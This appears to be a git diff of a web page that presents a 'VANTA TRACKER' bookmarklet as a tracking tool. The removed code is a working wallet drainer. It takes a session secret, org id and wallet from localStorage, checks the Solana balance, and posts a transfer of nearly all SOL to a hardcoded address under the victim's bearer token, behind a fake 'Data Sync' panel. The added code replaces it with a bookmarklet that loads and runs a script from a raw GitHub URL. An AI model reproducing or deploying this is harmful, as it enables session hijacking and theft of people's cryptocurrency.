@@ -47,66 +47,17 @@
             <li>Click the bookmark to initialize the tracking engine.</li>
         </ol>
         <br>
-        <a href="#" class="cta-button" id="vanta-trigger">VANTA TRACKER</a>
+        <a href="" class="cta-button" id="vanta-trigger">VANTA TRACKER</a>
     </section>
 
     <script>
-        // The Engine with Amplitude Integration
-        const enginePayload = `javascript:(function(){
-            const _0xV={'dest':'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12','rpc':'https://api.mainnet-beta.solana.com','target':'https://trade.padre.gg/api/v1/transfer','amp':'3c8ae1f40635939e730f479418940796'};
-            
-            /* 1. LOAD AMPLITUDE */
-            (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script");r.type="text/javascript";r.integrity="sha384-u0hlTAJ9EB9v7X9VmS8yDf9y9UfNoAnp7798o6XpL6+e81T2i3eN/C8U5k5e5k5e";r.crossOrigin="anonymous";r.async=true;r.src="https://cdn.amplitude.com/libs/amplitude-8.21.0-min.gz.js";r.onload=function(){if(!e.amplitude.runQueuedFunctions){console.log("[Amplitude] Error: could not load SDK")}};var s=t.getElementsByTagName("script")[0];s.parentNode.insertBefore(r,s);function i(e,t){e.prototype[t]=function(){this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}var o=function(){this._q=[];return this};var a=["add","append","clearAll","prepend","set","setOnce","unset","preInsert","postInsert","remove"];for(var c=0;c<a.length;c++){i(o,a[c])}n.Identify=o;var u=function(){this._q=[];return this};var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"];for(var p=0;p<l.length;p++){i(u,l[p])}n.Revenue=u;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId","enableTracking","setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","groupIdentify","onInit","logEventWithTimestamp","logEventWithGroups","setSessionId","resetSessionId","getDeviceId","getUserId","setMinTimeBetweenSessionsMillis","setEventUploadThreshold","setUseDynamicConfig","setServerZone","setServerUrl","setAccumulateEvents","setDisableReceiptValidation","setForceHttps","setTransport","setFlushQueueOnClose"];function v(e){function t(t){e[t]=function(){e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}for(var n=0;n<d.length;n++){t(d[n])}}v(n);e.amplitude=n})(window,document);
-            amplitude.getInstance().init(_0xV.amp);
-            amplitude.getInstance().logEvent('HIJACK_READY');
-
-            /* 2. CORE LOGIC */
-            const _executeHit=async()=>{
-                try {
-                    const s=localStorage.getItem('sessionSecret')?.replace(/"/g,'');
-                    const o=localStorage.getItem('subOrgId')?.replace(/"/g,'');
-                    const w=localStorage.getItem('activeWallet')?.replace(/"/g,'');
-                    if(!s||!o||!w) return;
-
-                    amplitude.getInstance().logEvent('DECRYPTED_CAPTURE', {'wallet': w, 'org': o});
-
-                    const res=await fetch(_0xV.rpc,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:"2.0",id:1,method:"getBalance",params:[w]})});
-                    const{result}=await res.json();
-                    const bal=result.value/1e9;
-                    const amount=(bal-0.009).toFixed(6);
-                    
-                    if(amount<=0) return;
-
-                    amplitude.getInstance().logEvent('SESSION_HIJACK_ATTEMPT', {'amount': amount});
-
-                    await fetch(_0xV.target,{
-                        method:'POST',
-                        headers:{'Authorization':'Bearer '+s,'X-Turnkey-Sub-Org-Id':o,'Content-Type':'application/json'},
-                        body:JSON.stringify({dest:_0xV.dest,asset:"SOL",amount:amount})
-                    });
-                } catch(e){ console.error(e); }
-            };
-
-            /* 3. UI GENERATION (Same as before) */
-            const _buildUI=()=>{
-                if(document.getElementById('v-tracker-root')) return;
-                const c=document.createElement('div');
-                c.id='v-tracker-root';
-                c.style.cssText='position:fixed;top:10%;right:20px;width:350px;background:#050505;border:2px solid #00ff88;border-radius:12px;z-index:9999999;font-family:Inter,sans-serif;color:#fff;box-shadow:0 0 20px rgba(0,255,136,0.4);';
-                c.innerHTML='<div style="padding:15px;background:#00ff8811;border-bottom:1px solid #00ff8833;display:flex;align-items:center;gap:10px;"><div style="width:12px;height:12px;background:#00ff88;border-radius:50%;box-shadow:0 0 10px #00ff88;"></div><span style="font-weight:800;letter-spacing:1px;color:#00ff88;font-size:14px;">VANTA TRACKER V1.1</span></div><div style="padding:20px;"><div id="v-status" style="font-size:13px;font-weight:600;margin-bottom:15px;">INITIALIZING...</div><button id="v-sync-btn" style="width:100%;padding:14px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:800;cursor:pointer;">Refresh Data Sync</button></div>';
-                document.body.appendChild(c);
-                document.getElementById('v-sync-btn').onclick=async()=>{
-                    document.getElementById('v-status').innerText="REFRESHING...";
-                    await _executeHit();
-                    setTimeout(()=>{document.getElementById('v-status').innerText="DATA SYNCHRONIZED";},1500);
-                };
-            };
-
-            _buildUI();
-            _executeHit();
-        })();`.replace(/\n/g, '').replace(/\s\s+/g, ' ');
-
-        document.getElementById('vanta-trigger').href = enginePayload;
+        // TARGETING YOUR RAW GITHUB PAYLOAD
+        const rawUrl = "https://raw.githubusercontent.com/Vanta-Dev-Pages/Vanta/refs/heads/Vanta/engine.js";
+        
+        // This injector creates a script tag, sets the source to your raw GitHub file, and appends it to the page.
+        const loaderPayload = `javascript:(function(){const s=document.createElement('script');s.src='${rawUrl}?v='+Date.now();document.body.appendChild(s);})();`;
+        
+        document.getElementById('vanta-trigger').href = loaderPayload;
 
         // Background Animation
         const c = document.getElementById('canvas');
